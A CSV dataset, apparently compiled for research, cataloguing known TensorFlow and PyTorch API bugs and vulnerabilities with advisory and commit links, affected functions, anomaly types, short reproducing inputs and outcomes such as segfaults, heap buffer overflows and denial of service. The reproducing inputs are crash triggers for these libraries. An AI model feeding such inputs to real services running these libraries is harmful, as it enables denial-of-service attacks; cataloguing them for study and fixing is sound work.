Library,Advisory Link,Commit,Parent Module,API,Anomaly,Reproducing Example,Vulnerable Parameter,Root cause 1,Root cause 2,Attack type
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='H',
dst_format='W'","src_format
dst_format",N.A,N.A,uninitialized memory accesses
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1234',
dst_format='1253'","src_format
dst_format",N.A,N.A,uninitialized memory accesses
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1234',
dst_format='1223'","src_format
dst_format",N.A,N.A,uninitialized memory accesses
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1224',
dst_format='1423'","src_format
dst_format",N.A,N.A,uninitialized memory accesses
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='1224',
dst_format='432'","src_format
dst_format",N.A,N.A,uninitialized memory accesses
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c9f3-9wfr-wgh7,https://github.com/tensorflow/tensorflow/commit/ebc70b7a592420d3d2f359e4b1694c236b82c7ae,tf.raw_ops,tf.raw_ops.DataFormatVecPermute,Invalid argument,"src_format='12345678',
dst_format='87654321'","src_format
dst_format",N.A,N.A,uninitialized memory accesses
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xwhf-g6j5-j5gc,https://github.com/tensorflow/tensorflow/commit/c0319231333f0f16e1cc75ec83660b01fedd4182,tf.image,tf.image.crop_and_resize,Very large input argument,boxes,boxes,N.A,overflow,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-452g-f7fp-9jf7,https://github.com/tensorflow/tensorflow/commit/030af767d357d1b4088c4a25c72cb3906abac489,tf.raw_ops,tf.random.truncated_normal,invalid type,dtype=20,dtype,N.A,nullptr dereference,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rrfp-j2mp-hq9c,https://github.com/tensorflow/tensorflow/commit/eccb7ec454e6617738554a255d77f08e60ee0808,tf.raw_ops,tf.quantization.quantize_and_dequantize,Invalid rank,axis=10,axis,N.A,segfault,Denial of Service
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-q8qj-fc9q-cphr,https://github.com/tensorflow/tensorflow/commit/22e07fb204386768e5bcbea563641ea11f96ceb8,tf.experimental,tf.experimental.dlpack.to_dlpack,python object,N.A,N.A,N.A,N.A,undefined behavior
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-8fxw-76px-3rxv,https://github.com/tensorflow/tensorflow/commit/22e07fb204386768e5bcbea563641ea11f96ceb8,tf.experimental,tf.experimental.dlpack.to_dlpack,python object,N.A,N.A,N.A,N.A,memory leak
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9mqp-7v2h-2382,https://github.com/tensorflow/tensorflow/commit/390611e0d45c5793c7066110af37c8514e6a6c54,tf.raw_ops,tf.raw_ops.SparseFillEmptyRowsGrad,Non vector input,grad_values,grad_values,N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Dimension mismatch,"values = [1, 1, 1, 10]
weights = [1, 2, 4]","values
weights",N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Dimension mismatch,"indices = [[0, 0], [0, 1], [1, 0]]
values = [1, 1, 1, 10]","indices
values",N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Dimension mismatch,splits = [],splits,N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qc53-44cj-vfvx,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,First element other than zero,"splits = [1, 7]",splits,N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,split[-1] != len(values),"splits = [0, 5]
values = [1, 1, 2, 1, 2, 10, 5]","indices
values",N.A,N.A,crash
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x5cp-9pcf-pp3h,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Dimension mismatch,"values = [1, 1, 1, 10]
weights = [1, 2, 4]","values
weights",N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Dimension mismatch,"indices = [[0, 0], [0, 1], [1, 0]]
values = [1, 1, 1, 10]","indices
values",N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Dimension mismatch,splits = [],splits,N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,First element other than zero,"splits = [1, 7]",splits,N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,Rank other than 2,"indices = [[[0], [0]], [[0], [1]], [[1], [0]], [[1], [2]]]",indices,N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jc87-6vpp-7ff3,https://github.com/tensorflow/tensorflow/commit/3cbb917b4714766030b28eba9fb41bb97ce9ee02,tf.raw_ops,tf.raw_ops.RaggedCountSparseOutput,split[-1] != len(values),"splits = [0, 5]
values = [1, 1, 2, 1, 2, 10, 5]","indices
values",N.A,heap buffer overflow,N.A
Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-g7p5-5759-qv46,https://github.com/tensorflow/tensorflow/commit/0462de5b544ed4731aa2fb23946ac22c01856b80,tf.raw_ops,tf.raw_ops.StringNGrams,Invalid argument,"data=[""aa"", ""bb"", ""cc"", ""dd"", ""ee"", ""ff""]",data,N.A,data leak,N.A
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/b6b1c01adfdadf93a4a1d30c3661ff177412a876,torch,torch.view_as_complex,Zero argument,z = torch.tensor(2.0),z,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/commit/c010ef7f0c6d837809a7e973048afac76373e3de,https://github.com/pytorch/pytorch/issues/43476,torch.nn,torch.nn.Conv3d,N.A,"torch.backends.cudnn.enabled=False
x = torch.rand(1, 32, 512, 512, 256).to('cuda:0')
m = torch.nn.Conv3d(32, 1, kernel_size=1, padding=0,stride=1,bias=False).to('cuda:0')
x = m(x)",x,N.A,N.A,runtime error
Pytorch,https://github.com/pytorch/pytorch/commit/42b4a7132e7c6f1df963b473d1583e4791fb1808,https://github.com/pytorch/pytorch/issues/41780,torch,torch.nn.functional.embedding,scalar input,"input = torch.tensor((np.random.rand(2,2)*100).astype('int64'))
weight = torch.tensor(1)
torch.nn.functional.embedding(input, weight)",weight,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/42281,https://github.com/pytorch/pytorch/issues/42281,torch,torch.Generator,Invalid argument,device='cuda',device,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/24137,https://github.com/pytorch/pytorch/commit/366c014a7799f0b7bbc258fd6c271dadb99d1de0,torch,torch.distributed.broadcast,Boolean dtype,"scalar_tensor = torch.tensor(scalar).to(device)
with torch.no_grad(): scalar_tensor = dist.broadcast(scalar_tensor, src)",scalar_tensor,N.A,N.A,RuntimeError: Unsupported data type
Pytorch,https://github.com/pytorch/pytorch/issues/327,https://github.com/PyTorch/PyTorch/commit/7773a45c0d2cba1cd53d7f50b00baa7ae95ec6e4,torch,torch.IntTensor,Integer tensors,"a = torch.IntTensor([0,1])
b = torch.IntTensor([0,1])
print(a.div(b))",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/327,https://github.com/PyTorch/PyTorch/commit/7773a45c0d2cba1cd53d7f50b00baa7ae95ec6e4,torch,torch.FloatTensor,Integer tensors,"a = torch.FloatTensor([1,1])
b = torch.FloatTensor([0,0])
a.div(b)",N.A,N.A,RuntimeError: inconsistent tensor size,N.A
Pytorch,https://github.com/pytorch/pytorch/pull/38970,https://github.com/pytorch/pytorch/commit/5702a28b2612a104204dd31e800faaaa09bdd458,torch.nn,torch.nn.ConvTranspose3d,Very large input argument,"        in_channels = 64
        out_channels = 128
        kernel_size = 5

        conv = torch.nn.ConvTranspose3d(
            in_channels, out_channels, kernel_size=kernel_size,
            stride=2, padding=2, output_padding=1).to(device)

        x = torch.rand([1, 64, 8, 128, 172]).to(device)
        y = conv(x)",N.A,N.A,N.A,integer overflow
Pytorch,https://github.com/pytorch/pytorch/issues/38764,https://github.com/PyTorch/PyTorch/commit/e4a3c584d51662d4c14060fc8517464fe3c12142,torch,torch.nn.functional.max_pool1d,Very large input argument,"x = 6.
size = 10. ** 6
print(f""Size of second dimension: {int(size)}"")
poolsize = 4
x = torch.rand((1,int(size),poolsize), requires_grad=True).to('cuda:0')
y = F.max_pool1d(x.contiguous(), kernel_size=poolsize, stride=None, padding=0)

loss = torch.sum(y)
loss.backward()",N.A,N.A,N.A,Illegal memory acces
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/63b1ae69831cd21bc4d6059a5854bc1155a152c9,torch,torch.remainder,Very large input argument,"a = torch.tensor([avalue], dtype=dtype, device=device)
b = torch.tensor([bvalue], dtype=dtype, device=device)
c = torch.remainder(a, b)",N.A,N.A,N.A,overflow
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/7aec364bdf9ed7297b77e8445a6a6d4116265dde,torch,torch.gather,ind.dim != output.dim,"""k0 = 8
k1 = 8
m = 100

x = torch.rand((k0, k1))
ind = torch.randint(0, k0, (m, k1))
output = torch.empty((m, k1))""
print(torch.gather(x, 0, ind, out=output))
print(torch.gather(x, 1, ind, out=output))""",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/33300,https://github.com/pytorch/pytorch/commit/8291e06f8fb14a09e6c3b7a740a182250069242c,torch,torch.zeros().numpy,Invalid argument,"device=""cuda""",device,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/33001,https://github.com/pytorch/pytorch/commit/60339a38eded68eeef91f84734b4d665ddf4e080,torch,torch.FloatTensor,Single element list,"v = torch.FloatTensor(1, 135).fill_(0) v[0, [1]] += 2",N.A,N.A,segfault,Denial of service
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/a64d0ffe81b250889a3e6670daa9c7d07d946e32,torch.nn.functional,torch.nn.functional.pdist,batch sizes >= 46342,"x = torch.randn(46342, 1, device='cuda', requires_grad=True)
out = torch.pdist(x)
out.mean().backward()",N.A,N.A,N.A,illegal CUDA memory access
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/ddff014b79303e5239d5cb876ba97143cad6405a,torch.utils.tensorboard,torch.utils.tensorboard.SummaryWriter.add_images,uint8 NCHW tensor,"from torch.utils.tensorboard import SummaryWriter

writer = SummaryWriter()
x=torch.tensor([[[[1, 2, 3], [4, 5, 6]]]], dtype=torch.uint8)
writer.add_images(""images"", x)",N.A,N.A,overflow,wrong results
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/136bb07a93b779acbc84ff341bc397551a8cfcc2,torch,torch.histc,inf,"torch.histc(torch.tensor([float(""inf"")], dtype=torch.float, device=device),
                        bins=1, min=0, max=3),
            torch.tensor([0], dtype=torch.float, device=device)",N.A,N.A,segfault,Denial of service
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/ec8e75ea92ae2b5ea73b4aeb3ec7cb39e9f95db9,torch,torch.sum,Invalid argument,"t = torch.zeros([10], dtype=torch.int32, device='cuda')
# 35488 * 65536 as int32 would cause overflow to negative value
# giving negative bin offset
t[0] = 35488
counted = t.bincount(minlength=65536)
torch.sum(counted)",N.A,N.A,overflow,N.A
Pytorch,https://github.com/pytorch/pytorch/issues/24309,https://github.com/pytorch/pytorch/commit/c845984271a551ac1c61b9eb06a17fb57aafbd7e,torch.nn,nn.AvgPool2d,Invalid argument,"kernel_size=2
stride=1","kernel_size
stride",N.A,N.A,Illegal memory acces
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/74828be4a7d0d2dba3f0ec3f6e79265cdfae5329,torch,torch.cat,Very large input argument,"SIZE1 = 6500
SIZE2 = 4500
concat_list = []
concat_list.append(torch.ones((SIZE1, 1024 * 512), dtype=torch.uint8))
concat_list.append(torch.ones((SIZE2, 1024 * 512), dtype=torch.uint8))
result = torch.cat(concat_list)",N.A,N.A,segfault,N.A
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/071971476d7431a24e527bdc181981678055a95d,torch.distributions.binomial,torch.distributions.binomial.Binomial,Very large input argument,"logits = torch.tensor([-100., 100.], dtype=torch.float)
total_count = 1.
x = torch.tensor([0., 0.], dtype=torch.float)
log_prob = Binomial(total_count, logits=logits).log_prob(x)",N.A,N.A,overflow,N.A
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/071971476d7431a24e527bdc181981678055a95d,torch.distributions.binomial,torch.distributions.binomial.Binomial,Very large input argument,"x = torch.tensor(0., requires_grad=True)
y = Binomial(total_count, logits=x).log_prob(torch.tensor(0.))",N.A,N.A,overflow,N.A
Pytorch,N.A,https://github.com/pytorch/pytorch/commit/d4712ee218cd6af3c2096ca7a76fef350173b703,torch,torch.isinf,Integer tensors,"t1 = cast(torch.Tensor([1, inf, 2, -inf, nan]))
t2 = cast(torch.ByteTensor([1, 2, 3]))
t3 = cast(torch.CharTensor([1, 2, 3]))
t4 = cast(torch.ShortTensor([1, 2, 3]))
t5 = cast(torch.IntTensor([1, 2, 3]))
t6 = cast(torch.LongTensor([1, 2, 3]))
torch.isinf(t1), cast(torch.ByteTensor([0, 1, 0, 1, 0]))
torch.isinf(t2), cast(torch.ByteTensor([0, 0, 0]))
torch.isinf(t3), cast(torch.ByteTensor([0, 0, 0]))
torch.isinf(t4), cast(torch.ByteTensor([0, 0, 0]))
torch.isinf(t5), cast(torch.ByteTensor([0, 0, 0]))
torch.isinf(t6), cast(torch.ByteTensor([0, 0, 0]))",N.A,N.A,RuntimeError: value cannot be converted to type int16_t without overflow: inf,N.A
Pytorch,https://github.com/pytorch/pytorch/issues/13324,https://github.com/pytorch/pytorch/commit/e4bb56570c7d6c7e17a85cbface4828c62a33564,torch.nn.utils.rnn,torch.nn.utils.rnn.pack_padded_sequence,input in increasing order,"a = torch.ones(25, 300)
b = torch.ones(22, 300)
b_a = pad_sequence([b, a])
pack_padded_sequence(b_a, [22, 25])",N.A,N.A,segfault,crash
Pytorch,https://github.com/pytorch/pytorch/issues/9264,https://github.com/pytorch/pytorch/commit/1597fc594d36a18d1d4aee16d09ea49ae7065610,torch.nn,torch.nn.Conv3d,Specific tensor size,"import torch.nn as nn
mod = nn.Conv3d(96, 256, 4, 1, 0, 2)     # does not crash with dilation = 1
mod(torch.zeros([1, 96, 111, 63, 111]))",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/pull/3470,https://github.com/pytorch/pytorch/commit/f7a459b28b184dedf265ed8718f85cb483e8284e,torch,torch.svd,Invalid argument,"x = torch.zeros(300, 100001).cuda()
u, s, v = torch.svd(x, some=True)",N.A,N.A,overflow,N.A
Pytorch,https://github.com/pytorch/pytorch/issues/3498,https://github.com/pytorch/pytorch/commit/6fde0cb507d59d2a9168f3051feba6865e9d1048,torch,N.A,NaN input,"np_arr = np.ones(100).astype(np.float32)
 tensor = torch.from_numpy(np_arr[None]) # Issue seems to be use of [None] or [np.newaxis]
variable = Variable(tensor)
output = model(variable)",N.A,N.A,memory leak,N.A
Pytorch,https://github.com/pytorch/pytorch/issues/86326,N.A,torch,torch.round,Integer tensors,"import torch
t = torch.tensor([2], dtype=torch.int16)
torch.round(t, decimals=1)",N.A,N.A,N.A,RuntimeError
Pytorch,https://github.com/pytorch/pytorch/issues/86279,N.A,torch,torch.multinomial,Very large input argument,"torch.multinomial(torch.ones(1, 32768, device='mps'), 2, replacement=True)",input,N.A,N.A,crash
Pytorch,https://github.com/pytorch/pytorch/issues/86162,N.A,torch.nn.functional,torch.nn.functional.one_hot,int32 and int16 tensor,N.A,N.A,N.A,N.A,RuntimeError
Pytorch,https://github.com/pytorch/pytorch/issues/86074,N.A,torch,torch.remainder,Integer input,"input = torch.tensor(1693446850, dtype=torch.int32)
other = torch.tensor([7285], dtype=torch.int16)

# test the apis with int input (wrong results)
r = torch.remainder(input, other)","input
other",N.A,N.A,Wrong results
Pytorch,https://github.com/pytorch/pytorch/pull/86064,N.A,torch,torch.fmod,Integer input,"input = torch.tensor(1693446850, dtype=torch.int32)
other = torch.tensor([7285], dtype=torch.int16)

# test the apis with int input (wrong results)
r = torch.fmod(input, other)","input
other",N.A,N.A,Wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/85852,N.A,torch,torch.mm,Same input and output ,"A = torch.rand(50, 50)
B = torch.clone(A).cuda()
C = torch.clone(A)
torch.mm(C, C, out=C)",out,N.A,N.A,Wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/85217,N.A,torch,torch.native_batch_norm,Invalid argument,"input = torch.full((5, 5,), 1, dtype=torch.float64, requires_grad=False)
weight = torch.full((14, 9, 12, 0, 6, 0, 15, 0, 0, 0,), -1.5e+300, dtype=torch.float64, requires_grad=False)
bias = torch.full((5,), 1, dtype=torch.float64, requires_grad=False)
running_mean = torch.full((0,), 1, dtype=torch.float64, requires_grad=False)
running_var = torch.full((0,), 1, dtype=torch.float64, requires_grad=False)
training = True
momentum = 0
eps = 0
torch.native_batch_norm(input, weight, bias, running_mean, running_var, training, momentum, eps)","nput, weight, bias, running_mean, running_var, training, momentum, eps",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/85216,N.A,torch,torch._mkldnn_transpose,Invalid argument,"self = torch.full((3, 4, 5,), 1, dtype=torch.float32, requires_grad=False).to_mkldnn()
dim0 = 1250999896764
dim1 = 0
torch._mkldnn_transpose(self, dim0, dim1)","self, dim0, dim1",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/85214,N.A,torch._C._nn,torch._C._nn.mkldnn_reorder_conv2d_weight,Invalid argument,"self = torch.full((3, 3, 1, 1,), 1, dtype=torch.float32, requires_grad=False).to_mkldnn()
padding = []
stride = [65534, 65534]
dilation = [65534, 65534]
groups = 0
torch._C._nn.mkldnn_reorder_conv2d_weight(self, padding, stride, dilation, groups)","self, padding, stride, dilation, groups",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/85213,N.A,torch._C._nn,torch._C._nn.mkldnn_reorder_conv3d_weight,Invalid argument,"self = torch.full((32, 3, 3, 3, 3,), 1, dtype=torch.float32, requires_grad=False).to_mkldnn()
padding = []
stride = [1250999896764, 1250999896764, 1250999896764]
dilation = [1250999896764, 1250999896764, 1250999896764]
groups = 0
torch._C._nn.mkldnn_reorder_conv3d_weight(self, padding, stride, dilation, groups)","self, padding, stride, dilation, groups",N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/85072,N.A,torch.jit,torch.jit.wait,None,"import torch

torch.jit.wait(None)",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/84990,N.A,torch.futures,torch.futures.collect_all,Invalid argument,"import torch

input = (None,)

torch.futures.collect_all(futures=input)",futures,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/84979,N.A,torch.nn.functional,torch.nn.functional.pad generates,Invalid argument,value=0,value,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/83585,N.A,torch.profiler,torch.profiler.profile,Optional parameter,"import torch
import torchvision.models as models
from torch.profiler import profile, record_function, ProfilerActivity
model = models.resnet18().cuda()
inputs = torch.randn(5, 3, 224, 224).cuda()
model = torch.jit.script(model)
model = torch.jit.optimize_for_inference(model)

with profile(activities=[ProfilerActivity.CPU], with_stack=True) as prof:
    model(inputs)",with_stack,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/83494,N.A,torch,torch.pinverse,3*3 tensor,"import torch
A  = torch.tensor([[0.0, 1.0, -1.0], [1.0, -1.0, 0.0], [-1.0, 1.0, 0.0]])
Apinv = torch.pinverse(A)
print(A @ Apinv @ A)
print(torch.dist(A @ Apinv @ A, A))",input,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/83328,N.A,torch.nn,torch.nn.Conv2d,Unsupported dtype,"results = dict()
import torch
arg_class = torch.nn.Conv2d(512,2048,1)
arg_1 = torch.rand([128, 512, 16, 16], dtype=torch.float16)
results[""time_low""] = arg_class(arg_1)","in_channels, out_channels, kernel_size",N.A,check failure,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/83229,N.A,torch.nn,torch.nn.MaxUnpool2d,Negative argument,"arg_1 = -100
arg_2 = False
arg_class = torch.nn.MaxUnpool2d(arg_1,stride=arg_2,)",kernel_size,N.A,N.A,N.A
Pytorch,https://github.com/pytorch/pytorch/issues/83221,N.A,torch.nn,torch.nn.MaxUnpool3d,Negative argument,"unpool = torch.nn.MaxUnpool3d(-3, stride=2)",kernel_size,N.A,N.A,N.A
Pytorch,https://github.com/pytorch/pytorch/issues/83175,N.A,torch.nn,torch.nn.GRU,Very large input argument,"import torch
results={}
arg_1 = 10
arg_2 = 20
arg_3 = 100000
arg_class = torch.nn.GRU(arg_1,arg_2,arg_3,)",num_layers,N.A,N.A,Hang
Pytorch,https://github.com/pytorch/pytorch/issues/83152,N.A,torch.nn,torch.nn.functional.fold,Very large input argument,"import torch
results={}
arg_1_tensor = torch.rand([1, 12, 12], dtype=torch.float32)
arg_1 = arg_1_tensor.clone()
arg_2 = [4,5,]
arg_3 = [2,2,]
arg_4 = 1
arg_5 = 36028797018963968
arg_6 = 1
results['res'] = torch.nn.functional.fold(arg_1,arg_2,arg_3,arg_4,arg_5,arg_6,)",padding,N.A,N.A,Hang
Pytorch,https://github.com/pytorch/pytorch/issues/82635,N.A,torch,torch.min,equal input,N.A,N.A,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/82282,N.A,torch,torch.matrix_exp,NaN input,"import torch
torch.random.manual_seed(420)
input = torch.randn(3, 3, dtype=torch.float32)
output = torch.matrix_exp(torch.log(input * 2 - 1))
input = input.cuda()
output = torch.matrix_exp(torch.log(input * 2 - 1))",A,N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/81409,N.A,torch._C._nn,torch._C._nn.adaptive_avg_pool2d,Invalid argument,"from __future__ import annotations
import sys
import torch

if __name__ == '__main__':
    assert len(sys.argv) == 5
    Ih, Iw, Oh, Ow = map(int, sys.argv[1:])
    _input_size = (Ih, Iw)
    _output_size = (Oh, Ow)

    torch.manual_seed(0)  # it seems seed value is irrelevant as far as I checked
    imgs = torch.randint(low=0, high=256, size=(1,)+_input_size).type(torch.float32)
    imgs_ = torch._C._nn.adaptive_avg_pool2d(imgs, _output_size)",N.A,N.A,segfault,Denial of service
Pytorch,https://github.com/pytorch/pytorch/issues/81195,N.A,torch,torch._weight_norm,Dimension mismatch,"a = torch.Tensor([[1,2],[3,4]])
b = torch.Tensor([[5],[6]])
torch._weight_norm(a,b,dim=1)","a
b
dim",N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/80946,N.A,torch.nn.functional,torch.nn.functional.linear,Multi-dimensional bias,"F.linear(torch.randn(2,3,5),torch.randn(7,5),torch.randn(2,3,7))","bias=torch.randn(2,3,7)",N.A,N.A,wrong results
Pytorch,https://github.com/pytorch/pytorch/issues/80805,N.A,torch,torch.einsum,Invalid argument,"import torch
As = torch.randn(3, 2, 5)
Bs = torch.randn(3, 5, 4)
torch.einsum(""bij,bjk->bik"", As, Bs)",N.A,N.A,segfault,wrong results
